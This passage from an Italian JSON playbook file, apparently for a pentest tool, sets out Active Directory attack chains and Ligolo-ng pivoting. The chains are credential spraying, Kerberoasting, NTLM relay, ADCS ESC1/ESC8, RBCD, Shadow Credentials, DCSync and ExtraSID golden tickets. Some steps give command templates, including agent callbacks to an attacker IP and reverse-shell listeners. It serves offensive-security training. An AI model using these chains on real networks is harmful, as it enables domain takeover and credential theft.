          "template": "# Su Kali (proxy) con certificati autofirmati:\nligolo-ng -selfcert\n\n# Sul ponte (agent), 11601 è la porta di default; in VPN usa l'IP della VPN:\n./agent -connect <ip_attacker>:11601 -ignore-cert",
          "params": [
            {
              "key": "ip_attacker",
              "label": "IP attacker",
              "placeholder": "10.10.14.5"
            }
          ]
        }
      },
      {
        "id": "s4",
        "verify": "Il comando elenca le sessioni disponibili e dopo la selezione il prompt riporta il contesto di quella scelta.",
        "title": "Seleziona la sessione",
        "cmd": {
          "name": "Ligolo — session",
          "description": "Prima di interagire con la rete interna imposta il tunnel: esegui `session` e seleziona l'id della sessione con cui interagire; poi `ifconfig` per verificare le connessioni di rete sull'agente connesso (annota la subnet interna).",
          "template": "session\nifconfig",
          "params": []
        }
      },
      {
        "id": "s5",
        "verify": "Dopo `start` l'interfaccia `ligolo` passa a UP e gli host della rete interna rispondono da Kali senza altra configurazione.",
        "title": "Aggiungi la route e start",
        "cmd": {
          "name": "Ligolo — route + start",
          "description": "Aggiungi una voce alla tabella di routing così Ligolo instrada il traffico nel tunnel verso la rete di destinazione, poi dalla console digiti `start`. Ora puoi eseguire qualsiasi strumento da Kali per interagire con la rete interna, come se fossi connesso direttamente.",
          "template": "# <internal_net> nel formato x.x.x.x/xx (es. 172.16.119.0/24):\nsudo ip route add <internal_net> dev ligolo\n\n# poi nella console ligolo-ng:\nstart",
          "params": [
            {
              "key": "internal_net",
              "label": "Rete interna",
              "placeholder": "172.16.119.0/24"
            }
          ]
        }
      }
    ]
  },
  {
    "id": "ligolo-double-pivot",
    "name": "Doppio pivoting con Ligolo-ng",
    "short": "ligolo2",
    "category": "lateral",
    "subcategory": "pivoting",
    "tactic": "Lateral Movement",
    "difficulty": "hard",
    "estTime": "15 min",
    "objective": "Raggiungere una seconda rete interna che tocca solo il secondo ponte, incatenando due agent Ligolo. Sul primo agent si apre un listener che rilancia le connessioni verso il proxy sulla Kali, il secondo ponte si collega a quel listener e riceve un'interfaccia tun dedicata, così i due tunnel restano attivi insieme senza proxychains.",
    "outcome": "Seconda rete interna raggiungibile da Kali sull'interfaccia ligolo2",
    "prereqs": [
      "Primo pivot Ligolo già attivo (playbook Pivoting con Ligolo-ng)",
      "Shell sul secondo ponte, dual-homed fra prima e seconda rete interna",
      "Binario agent per il sistema del secondo ponte",
      "Firewall locale del primo ponte apribile sulla porta del relay (ufw e simili)"
    ],
    "mitre": [
      "T1090",
      "T1572"
    ],
    "refs": [
      {
        "label": "Guide to Pivoting using Ligolo-ng — Medium",
        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
      },
      {
        "label": "Ligolo-ng — repo ufficiale",
        "url": "https://github.com/nicocha30/ligolo-ng"
      }
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`listener_list` mostra il listener attivo sulla porta scelta del primo ponte; da una shell sul secondo ponte un `nc -vz <ip_ponte1> 11602` risponde aperto.",
        "title": "Listener relay sul primo ponte (sessione agent 1)",
        "cmd": {
          "name": "Ligolo — listener_add sul ponte 1",
          "description": "Il secondo ponte non ha rotta verso l'IP VPN della Kali, quindi il primo agent fa da relay. Attenzione ai due indirizzi: `--addr` è la porta in ascolto sull'agent, mentre `--to` viene aperto dalla Kali, dove gira il proxy. La porta 11602 evita confusione con la 11601 che il primo agent usa già in uscita.",
          "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
          "params": [
            {
              "key": "kali_ip",
              "label": "IP VPN Kali",
              "placeholder": "10.10.16.72"
            }
          ],
          "variants": [
            {
              "id": "kali-ip",
              "label": "Verso IP Kali",
              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
              "description": "Forma esplicita: la Kali apre la connessione verso il proprio IP VPN. Funziona sia con il proxy in ascolto su tutte le interfacce sia con il proxy legato al solo IP della VPN."
            },
            {
              "id": "loopback",
              "label": "Verso loopback",
              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp\nlistener_list",
              "description": "Forma della documentazione ufficiale: il proxy viene raggiunto sul loopback della Kali. Vale solo se il proxy è in ascolto su 0.0.0.0, come fa `ligolo-ng -selfcert` senza `-laddr`; con un bind sul solo IP VPN la connessione viene rifiutata."
            }
          ]
        }
      },
      {
        "id": "s2",
        "verify": "L'agent è presente sul secondo ponte ed è eseguibile.",
        "title": "Porta l'agent sul secondo ponte",
        "variant": "linux",
        "cmd": {
          "name": "Trasferimento agent sul ponte 2",
          "description": "Il primo tunnel rende la rete interna raggiungibile dalla Kali come una rete locale, quindi la copia parte direttamente dall'attacker verso l'IP interno del secondo ponte. La scelta del canale dipende da cosa espone il ponte: SSH, WinRM oppure un server HTTP sulla Kali con un download lanciato dalla shell.",
          "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
          "params": [
            {
              "key": "agent",
              "label": "Path agent",
              "placeholder": "./agent"
            },
            {
              "key": "user",
              "label": "User ponte 2",
              "ctx": "user",
              "placeholder": "svc-app"
            },
            {
              "key": "pivot2",
              "label": "IP interno ponte 2",
              "placeholder": "172.16.139.3"
            },
            {
              "key": "hash",
              "label": "NT hash",
              "ctx": "hash",
              "placeholder": "e7d499a2cd11b1ba3875a60812e21894"
            }
          ],
          "variants": [
            {
              "id": "linux",
              "label": "Linux — scp",
              "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
              "description": "Copia via SSH attraverso il primo tunnel, poi bit di esecuzione sul file."
            },
            {
              "id": "windows",
              "label": "Windows — evil-winrm",
              "template": "evil-winrm -i <pivot2> -u <user> -H <hash>\n\n# dalla sessione evil-winrm:\nupload ./agent.exe C:\\\\Windows\\\\Temp\\\\agent.exe",
              "description": "Su un ponte Windows l'agent viene caricato dalla sessione evil-winrm, con password o pass-the-hash."
            }
          ]
        }
      },
      {
        "id": "s3",
        "verify": "Nella console del proxy compare un secondo `Agent joined` e `session` elenca ora due agent distinti.",
        "title": "Connetti il secondo agent al listener",
        "variant": "linux",
        "cmd": {
          "name": "Ligolo — agent 2 verso il ponte 1",
          "description": "L'agent sul secondo ponte non punta alla Kali ma all'IP interno del primo ponte, sulla porta del relay. La connessione risale il primo tunnel, il proxy la registra come nuova sessione. Il flag `-ignore-cert` serve finché il proxy gira con certificati autofirmati.",
          "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
          "params": [
            {
              "key": "pivot1_internal",
              "label": "IP interno ponte 1",
              "placeholder": "172.16.139.10"
            }
          ],
          "variants": [
            {
              "id": "linux",
              "label": "Linux",
              "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
              "description": "Da lanciare in background o sotto `nohup` se la shell è instabile."
            },
            {
              "id": "windows",
              "label": "Windows",
              "template": "C:\\Windows\\Temp\\agent.exe -connect <pivot1_internal>:11602 -ignore-cert",
              "description": "Stessa connessione dal ponte Windows, lanciata dalla sessione evil-winrm o da una shell remota."
            }
          ]
        }
      },
      {
        "id": "s4",
        "verify": "`ip addr` elenca sia `ligolo` sia `ligolo2`; la seconda resta DOWN finché il tunnel non parte.",
        "title": "Crea la seconda interfaccia TUN (Kali)",
        "cmd": {
          "name": "Ligolo — interfaccia ligolo2",
          "description": "Ogni tunnel vuole la sua interfaccia: la prima resta dedicata al ponte 1, la seconda al ponte 2. Senza interfaccia separata il secondo tunnel ruberebbe quella della prima sessione. Dalla versione 0.6 la stessa cosa si fa dalla console con `interface_create --name ligolo2`.",
          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up",
          "params": []
        }
      },
      {
        "id": "s5",
        "verify": "Il prompt riporta il contesto del secondo agent e `ifconfig` mostra una subnet assente sul primo ponte.",
        "title": "Seleziona la sessione del secondo agent",
        "cmd": {
          "name": "Ligolo — session sul ponte 2",
          "description": "Con `session` si passa alla sessione del secondo agent, poi `ifconfig` elenca le sue interfacce: quella che non compariva sul primo ponte è la rete da raggiungere. La subnet letta qui è il valore da usare nella route dello step successivo.",
          "template": "session\nifconfig",
          "params": []
        }
      },
      {
        "id": "s6",
        "verify": "`tunnel_list` mostra due sessioni Online, una su `ligolo` e una su `ligolo2`, e gli host della seconda rete rispondono da Kali mentre il primo tunnel resta operativo.",
        "title": "Avvia il secondo tunnel e aggiungi la route",
        "cmd": {
          "name": "Ligolo — tunnel_start su ligolo2",
          "description": "Il tunnel parte legandosi all'interfaccia dedicata invece che alla prima, poi la route manda il traffico della seconda rete dentro quell'interfaccia. Da qui i tool girano dalla Kali contro la rete profonda come se fosse locale. Sulle versioni precedenti alla 0.6 il comando è `start --tun ligolo2`.",
          "template": "# nella sessione del secondo agent:\ntunnel_start --tun ligolo2\ntunnel_list\n\n# sulla Kali, <internal_net2> nel formato x.x.x.x/xx:\nsudo ip route add <internal_net2> dev ligolo2",
          "params": [
            {
              "key": "internal_net2",
              "label": "Seconda rete interna",
              "placeholder": "172.16.210.0/24"
            }
          ]
        }
      },
      {
        "id": "s7",
        "verify": "La shell dalla rete profonda arriva sul listener locale della Kali senza che il target veda mai l'IP VPN dell'attacker.",
        "title": "Rientro delle reverse shell dalla rete profonda",
        "cmd": {
          "name": "Ligolo — listener per reverse shell",
          "description": "Gli host della seconda rete non raggiungono la Kali, quindi il payload punta all'IP del secondo ponte. Un listener sulla sessione dell'agent 2 rilancia quella porta verso la Kali, dove `nc` o l'handler Metasploit aspettano. Anche qui il firewall locale del ponte va aperto sulla stessa porta.",
          "template": "# nella sessione del secondo agent:\nlistener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp\n\n# sulla Kali:\nnc -lvnp <port>",
          "params": [
            {
              "key": "port",
              "label": "Porta reverse",
              "placeholder": "4444"
            }
          ]
        }
      }
    ]
  },
  {
    "id": "gpp-spray-foothold",
    "name": "GPP/SYSVOL, Spray, Foothold",
    "short": "gpp",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Recuperi una password lasciata nei Group Policy Preferences dentro la share SYSVOL, la decifri (la chiave AES è pubblica) e la riusi in spray sul dominio per ottenere il primo foothold. È uno dei percorsi più comuni quando si parte da una sessione null/anonima.",
    "outcome": "Credenziali di dominio valide e una shell su un host",
    "prereqs": [
      "Accesso in lettura alla share SYSVOL (spesso basta una sessione null o un utente qualsiasi)"
    ],
    "mitre": [
      "T1552.006",
      "T1110.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Recupera le credenziali dai GPP",
        "cmdRef": "nxc-smb-gpp",
        "variant": "gpp",
        "verify": "Il modulo stampa `Found credentials` con username e password già decifrata. Se invece hai trovato tu un `cpassword` dentro un `Groups.xml` sulla SYSVOL, decifralo a mano con `gpp-decrypt <cpassword>`."
      },
      {
        "id": "s2",
        "title": "Controlla la lockout policy",
        "cmdRef": "nxc-smb-passpol",
        "verify": "Leggi `Account Lockout Threshold` prima di spruzzare: se è basso (es. 3-5) usa una sola password per giro per non bloccare gli account."
      },
      {
        "id": "s3",
        "title": "Spray della credenziale sul dominio",
        "cmdRef": "nxc-smb-spray",
        "variant": "default",
        "verify": "Un `[+]` (o `(Pwn3d!)` se l'utente è admin locale) segnala dove la coppia trovata è valida. La stessa password è spesso riusata da più account."
      },
      {
        "id": "s4",
        "title": "Apri la shell",
        "cmdRef": "nxc-winrm",
        "variant": "default",
        "verify": "`whoami` conferma l'accesso come l'utente compromesso. Se WinRM è chiuso, prova psexec/wmiexec o RDP."
      }
    ]
  },
  {
    "id": "asrep-kerb-dcsync",
    "name": "AS-REP, Kerberoast, `DCSync`",
    "short": "offline",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min + crack",
    "objective": "Escalation tutta offline: raccogli gli hash AS-REP, ne cracki uno, poi fai Kerberoast e arrivi al `DCSync`.",
    "outcome": "Dump dell'NTDS",
    "prereqs": [
      "LDAP visibile (anonymous o guest)"
    ],
    "mitre": [
      "T1558.004",
      "T1558.003",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Le righe `[+] VALID USERNAME:` elencano gli account realmente esistenti, mentre gli altri vengono scartati.",
        "title": "Enumera gli utenti di dominio validi",
        "cmdRef": "kerbrute-userenum"
      },
      {
        "id": "s2",
        "verify": "`asrep.txt` contiene hash che iniziano con `$krb5asrep$23$`. Un file vuoto significa che nessun account ha la pre-autenticazione disabilitata.",
        "title": "AS-REP roast degli account senza pre-auth",
        "cmdRef": "getnpusers"
      },
      {
        "id": "s3",
        "verify": "hashcat riporta `Status...: Cracked` e la password compare in coda alla riga dell'hash. Per l'AS-REP il mode corretto è 18200.",
        "title": "Cracka l'AS-REP (hashcat 18200)",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "18200"
        }
      },
      {
        "id": "s4",
        "verify": "`kerb.txt` contiene hash che iniziano con `$krb5tgs$23$*`, uno per ogni account di servizio con SPN registrato.",
        "title": "Kerberoast degli account con SPN",
        "cmdRef": "getuserspns"
      },
      {
        "id": "s5",
        "verify": "Qui il mode è 13100. La password recuperata va poi provata contro un account che in BloodHound risulti avere i diritti di replica.",
        "title": "Cracka e trova un account con diritti `DCSync`",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100"
        }
      },
      {
        "id": "s6",
        "verify": "Il dump elenca gli hash NT di tutto il dominio a partire da `Administrator:500:`, incluso `krbtgt`.",
        "title": "`DCSync`",
        "cmdRef": "secretsdump"
      }
    ]
  },
  {
    "id": "kerberoast-crack",
    "name": "Kerberoast, Crack, Lateral",
    "short": "kerb",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Richiedi i TGS degli account con SPN, crackali offline e riusa la password trovata per muoverti.",
    "outcome": "Password di un service account (spesso privilegiato)",
    "prereqs": [
      "Credenziali di dominio valide"
    ],
    "mitre": [
      "T1558.003",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "`kerb.txt` contiene almeno un hash `$krb5tgs$23$*`. L'assenza di risultati significa che nessun account utente ha un SPN registrato.",
        "title": "Richiedi i TGS (Kerberoast)",
        "cmdRef": "getuserspns"
      },
      {
        "id": "s2",
        "verify": "`Status...: Cracked` con il mode 13100 e la password in chiaro accanto all'hash.",
        "title": "Cracka offline",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100",
          "hashfile": "kerb.txt"
        }
      },
      {
        "id": "s3",
        "verify": "La shell si apre come l'account di servizio compromesso e `whoami` ne conferma l'identità.",
        "title": "Riusa le credenziali",
        "cmdRef": "psexec"
      }
    ]
  },
  {
    "id": "responder-relay",
    "name": "Responder, NTLM Relay, Shell",
    "short": "relay",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "25 min",
    "objective": "Cattura NetNTLMv2 avvelenando LLMNR/NBT-NS; crackalo, oppure rilancialo (relay) verso host senza SMB signing per una shell.",
    "outcome": "Hash NetNTLMv2 o shell su un host senza signing",
    "prereqs": [
      "Posizione in rete (stesso segmento delle vittime)"
    ],
    "mitre": [
      "T1557.001",
      "T1212"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "L'elenco riporta gli host con `signing:False`, che sono gli unici bersagli validi per il relay.",
        "title": "Trova i target senza SMB signing",
        "cmdRef": "nxc-gen-relay-list",
        "variant": "default"
      },
      {
        "id": "s2",
        "verify": "Compare `[SMB] NTLMv2-SSP Hash` con l'hash dell'utente che ha risolto il nome. Gli hash vengono salvati anche in `/usr/share/responder/logs/`.",
        "title": "Avvelena e cattura",
        "cmdRef": "responder",
        "variant": "default"
      },
      {
        "id": "s3",
        "verify": "`Authenticating against smb://… SUCCEED` seguito da `Started interactive SMB client shell`. Responder va avviato con SMB e HTTP disabilitati per non intercettare la connessione destinata al relay.",
        "title": "Oppure rilancia (relay)",
        "cmdRef": "ntlmrelayx-smb",
        "variant": "default"
      }
    ]
  },
  {
    "id": "esc1-to-da",
    "name": "ADCS ESC1, Domain Admin",
    "short": "esc1",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da un utente di dominio qualsiasi arrivi a Domain Admin abusando di un template di certificato mal configurato (ESC1: client auth, enrollment per utenti poco privilegiati e SAN a piacere).",
    "outcome": "NT hash dell'Administrator o ticket da DA",
    "prereqs": [
      "Credenziali valide di un utente di dominio qualsiasi",
      "Accesso di rete al DC e ad ADCS",
      "Esiste almeno un template vulnerabile"
    ],
    "mitre": [
      "T1649",
      "T1078.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera i template ADCS vulnerabili",
        "cmdRef": "certipy-find",
        "verify": "Nel report di certipy compare il tag \"ESC1\"."
      },
      {
        "id": "s2",
        "title": "Richiedi il certificato di impersonazione",
        "cmdRef": "certipy-req",
        "overrides": {
          "upn": "administrator@<domain>"
        },
        "verify": "`Got certificate with UPN administrator@…`"
      },
      {
        "id": "s3",
        "title": "PKINIT: TGT e NT hash",
        "cmdRef": "certipy-auth",
        "verify": "`Got hash for administrator@…`"
      },
      {
        "id": "s4",
        "verify": "Il dump parte da `Administrator:500:` con il relativo hash NT e prosegue con tutti gli account di dominio.",
        "title": "Conferma DA con `DCSync`",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "administrator",
          "password": ":<hash>"
        }
      }
    ]
  },
  {
    "id": "rbcd-takeover",
    "name": "RBCD Takeover",
    "short": "rbcd",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Prendi il controllo di un computer tramite Resource-Based Constrained Delegation: scrivi AllowedToActOnBehalfOfOtherIdentity, poi S4U2Self+Proxy fino a una shell SYSTEM.",
    "outcome": "Shell SYSTEM sulla vittima",
    "prereqs": [
      "`GenericWrite`/WriteDACL sull'oggetto computer della vittima",
      "MachineAccountQuota > 0 (default 10), oppure un computer che già controlli"
    ],
    "mitre": [
      "T1134.001",
      "T1550.003"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Viene prodotto uno zip di file JSON. Caricato in BloodHound, un arco `GenericWrite` o `GenericAll` verso il computer target conferma la fattibilità.",
        "title": "Conferma l'ACL con BloodHound",
        "cmdRef": "bloodhound-py"
      },
      {
        "id": "s2",
        "verify": "`Successfully added machine account`. Il quota di default consente dieci computer per utente, quindi il limite può essere già esaurito.",
        "title": "Crea un computer account che controlli",
        "cmdRef": "addcomputer"
      },
      {
        "id": "s3",
        "title": "Scrivi msDS-AllowedToActOnBehalfOfOtherIdentity",
        "cmdRef": "rbcd-write",
        "verify": "`Delegation rights modified successfully!`"
      },
      {
        "id": "s4",
        "verify": "Le righe `Impersonating administrator` e `Saving ticket in administrator.ccache`. Il ticket va poi esportato con `export KRB5CCNAME=administrator.ccache`.",
        "title": "S4U2Self + S4U2Proxy come Administrator",
        "cmdRef": "getst-s4u",
        "overrides": {
          "impersonate": "administrator"
        }
      },
      {
        "id": "s5",
        "verify": "Si apre il prompt `C:\\Windows\\system32>` e `whoami` restituisce `nt authority\\system`.",
        "title": "PSExec con il ticket",
        "cmdRef": "psexec",
        "overrides": {
          "ip": "<victim>.<domain>",
          "user": "administrator",
          "password": ""
        }
      }
    ]
  },
  {
    "id": "shadowcred-pth",
    "name": "Shadow Credentials, NT hash, PtH",
    "short": "shadow",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da un diritto di scrittura (`GenericWrite`/`GenericAll`) su un utente o computer, aggiungi una Shadow Credential nell'attributo msDS-KeyCredentialLink, autentichi via PKINIT e ne ricavi l'NT hash. Il tutto senza resettare la password del target, quindi in modo non distruttivo e reversibile.",
    "outcome": "NT hash del target, riusabile in Pass-the-Hash",
    "prereqs": [
      "Edge `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` sul target (da BloodHound)",
      "ADCS o comunque PKINIT abilitato nel dominio"
    ],
    "mitre": [
      "T1552.004",
      "T1550.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l'edge di scrittura",
        "cmdRef": "bloodhound-py",
        "verify": "In BloodHound il tuo utente ha un edge `GenericWrite`, `GenericAll` o `AddKeyCredentialLink` verso il target. Senza quel diritto la scrittura di msDS-KeyCredentialLink fallisce."
      },
      {
        "id": "s2",
        "title": "Aggiungi la Shadow Credential e recupera l'hash",
        "cmdRef": "shadow-creds",
        "variant": "default",
        "verify": "`certipy-ad shadow auto` stampa `Got hash for...` con l'NT hash del target, poi rimuove da sé la KeyCredential aggiunta. È preferibile al reset password perché non rompe il login del legittimo utente."
      },
      {
        "id": "s3",
        "title": "Valida l'hash e trova dove è admin",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` indica gli host su cui l'hash dà privilegi amministrativi, pronti per il movimento laterale."
      },
      {
        "id": "s4",
        "title": "Apri la shell con l'hash",
        "cmdRef": "evil-winrm",
        "variant": "hash",
        "verify": "`whoami` conferma l'accesso come il target impersonato, usando l'hash al posto della password."
      }
    ]
  },
  {
    "id": "acl-path-to-da",
    "name": "Foothold, BloodHound, ACL, DA",
    "short": "aclpath",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Dal primo accesso al dominio arrivi a Domain Admin seguendo un attack path di ACL: mappi con BloodHound, abusi i diritti lungo il percorso e chiudi con `DCSync`.",
    "outcome": "Hash del dominio (`DCSync`)",
    "prereqs": [
      "Credenziali di un utente di dominio qualsiasi"
    ],
    "mitre": [
      "T1087.002",
      "T1222.001",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Lo zip viene prodotto e, caricato in BloodHound, la query Shortest Path to Domain Admins evidenzia un percorso percorribile dall'utente controllato.",
        "title": "Mappa il dominio con BloodHound",
        "cmdRef": "bloodhound-py"
      },
      {
        "id": "s2",
        "verify": "bloodyAD conferma la modifica. Il valore precedente non è recuperabile, quindi la password cambiata va segnalata nel report.",
        "title": "Abusa l'ACL lungo il path",
        "cmdRef": "acl-abuse"
      },
      {
        "id": "s3",
        "verify": "L'operazione va a buon fine e in BloodHound compaiono gli archi `GetChanges` e `GetChangesAll` verso il dominio.",
        "title": "Concediti i diritti di replica",
        "cmdRef": "writedacl-dcsync"
      },
      {
        "id": "s4",
        "verify": "Il dump parte da `Administrator:500:`. I diritti concessi al passo precedente vanno rimossi a fine attività con `remove dcsync`.",
        "title": "`DCSync` e cleanup",
        "cmdRef": "dcsync"
      }
    ]
  },
  {
    "id": "shadow-credentials",
    "name": "Shadow Credentials, NT hash",
    "short": "shadow",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Abusi la scrittura su `msDS-KeyCredentialLink` del target: aggiungi una chiave tua, autentichi via PKINIT e con UnPAC-the-hash ne ricavi l'NT hash, senza resettare la password. Se il DC non supporta PKINIT la tecnica non si applica e si ripiega sul targeted Kerberoast.",
    "outcome": "NT hash del target, riusabile in Pass-the-Hash o evil-winrm",
    "prereqs": [
      "Scrittura su `msDS-KeyCredentialLink` del target: `GenericWrite`, `GenericAll` o `WriteProperty` (in BloodHound l'arco `AddKeyCredentialLink`)",
      "Il DC supporta PKINIT: certificato KDC presente, tipico dove c'è AD CS. Senza, certipy/pywhisker falliscono al login PKINIT e la tecnica non è applicabile",
      "Livello di dominio Windows Server 2016 o superiore"
    ],
    "mitre": [
      "T1098",
      "T1558",
      "T1550.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l'arco in BloodHound",
        "cmdRef": "bloodhound-py",
        "verify": "Caricato lo zip, un arco `AddKeyCredentialLink` (oppure `GenericWrite`/`GenericAll`) da `<utente>` verso `<target>` conferma la fattibilità."
      },
      {
        "id": "s2",
        "title": "Aggiungi la key, PKINIT e UnPAC-the-hash",
        "cmdRef": "shadow-creds",
        "verify": "`certipy` stampa `Got hash for <target>`: l'NT hash è nel formato `aad3b...:<nthash>`. `shadow auto` rimuove da solo la key aggiunta.\n\nVarianti: NTLM disabilitato, variante Kerberos (`-k`); solo token Windows e nessuna password, variante Whisker con `Rubeus /getcredentials`; da Kali senza password, esporta prima il TGT con `Rubeus tgtdeleg` e usa `-k`."
      },
      {
        "id": "s3",
        "title": "Riusa l'NT hash",
        "cmdRef": "evil-winrm",
        "verify": "Pass-the-Hash: `evil-winrm -i <dc> -u <target> -H <nthash>` apre una shell se il target è in Remote Management Users. In alternativa `secretsdump -hashes:<nthash>` per dumpare altri segreti."
      }
    ]
  },
  {
    "id": "coerce-relay-adcs",
    "name": "Coerce + Relay, ADCS (ESC8)",
    "short": "esc8",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Initial Access",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da una posizione in rete senza credenziali: forzi il DC ad autenticarsi in NTLM e rilanci l'auth verso ADCS Web Enrollment per emettere un certificato del DC.",
    "outcome": "TGT del DC$ per il `DCSync`",
    "prereqs": [
      "Raggiungibilità L3 verso il DC e verso ADCS HTTP",
      "ADCS Web Enrollment attivo e senza Channel Binding"
    ],
    "mitre": [
      "T1187",
      "T1557.001",
      "T1649"
    ],
    "steps": [
      {
        "id": "s1",
        "verify": "Nel report di certipy compare il tag `ESC8` sull'endpoint web di enrollment.",
        "title": "Conferma l'esposizione a ESC8",
        "cmdRef": "certipy-find"
      },
      {
        "id": "s2",
        "verify": "ntlmrelayx segnala `Servers started, waiting for connections`.",
        "title": "Avvia ntlmrelayx verso /certsrv",
        "cmdRef": "ntlmrelayx-adcs"
      },
      {
        "id": "s3",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer",
        "verify": "`Authenticating against http://… as CORP/DC01$ SUCCEED`"
      },
      {
        "id": "s4",
        "verify": "`Got hash for 'dc01$@corp.local'`, ciòè l'hash NT del computer account del domain controller.",
        "title": "Converti il certificato in TGT per il DC$",
        "cmdRef": "certipy-auth"
      },
      {
        "id": "s5",
        "verify": "Il dump parte da `Administrator:500:` benché l'autenticazione sia avvenuta come account macchina.",
        "title": "`DCSync` come DC$",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "DC01$",
          "password": ""
        }
      }
    ]
  },
  {
    "id": "child-to-parent-extrasid",
    "name": "Child, Parent (ExtraSID)",
    "short": "extrasid",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da un child domain compromesso sali all'intero forest: forgia un Golden Ticket del child con il SID degli Enterprise Admins del parent iniettato come ExtraSID.",
    "outcome": "Enterprise Admin sul parent domain",
    "prereqs": [
      "DA (o hash krbtgt) sul child domain",
      "SID del child e degli Enterprise Admins del parent"
    ],
    "mitre": [
      "T1134.005",
      "T1558.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera il trust e ricava i SID",
        "cmd": {
          "name": "Trust + SID (child / parent)",
          "description": "Prima di forgiare il ticket servono due SID: quello del dominio child (per `-domain-sid`) e quello del parent, il cui gruppo Enterprise Admins è `<SID_parent>-519`. Va anche confermato che il trust sia interno al forest, altrimenti il SID filtering scarta l'ExtraSID.",
          "template": "# da Windows (PowerView):\nGet-DomainSID\nGet-DomainSID -Domain <parentdomain>\nGet-DomainTrust\n# da Linux (Impacket):\nimpacket-lookupsid <childdomain>/<user>:'<password>'@<parentdc>",
          "params": [
            {
              "key": "parentdomain",
              "label": "Parent domain",
              "placeholder": "corp.local"
            },
            {
              "key": "childdomain",
              "label": "Child domain",
              "placeholder": "child.corp.local"
            },
            {
              "key": "user",
              "label": "User",
              "ctx": "user",
              "placeholder": "childadmin"
            },
            {
              "key": "password",
              "label": "Password",
              "ctx": "password",
              "placeholder": "P@ssw0rd"
            },
            {
              "key": "parentdc",
              "label": "Parent DC",
              "placeholder": "10.10.10.5"
            }
          ]
        },
        "verify": "Ottieni il SID del child e quello del parent (Enterprise Admins = `<SID_parent>-519`). `Get-DomainTrust` deve mostrare la relazione `WITHIN_FOREST`: solo così l'ExtraSID non viene filtrato."
      },
      {
        "id": "s2",
        "verify": "Il dump riporta la riga `krbtgt:502:` con l'hash NT necessario a forgiare il ticket.",
        "title": "Dump del krbtgt del child",
        "cmdRef": "dcsync"
      },
      {
        "id": "s3",
        "verify": "`Saving ticket in hacker.ccache`. Il SID del dominio padre va indicato con il suffisso `-519`, che identifica il gruppo Enterprise Admins.",
        "title": "Forgia il Golden Ticket con ExtraSID",
        "cmdRef": "trust-extrasid"
      },
      {
        "id": "s4",
        "verify": "La shell si apre sul domain controller del dominio padre e `whoami /groups` mostra l'appartenenza a Enterprise Admins.",
        "title": "Accedi al parent DC",
        "cmdRef": "psexec"
      }
    ]
  },
  {
    "id": "unconstrained-to-dcsync",
    "name": "Unconstrained, Coerce, `DCSync`",
    "short": "unconstrained",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
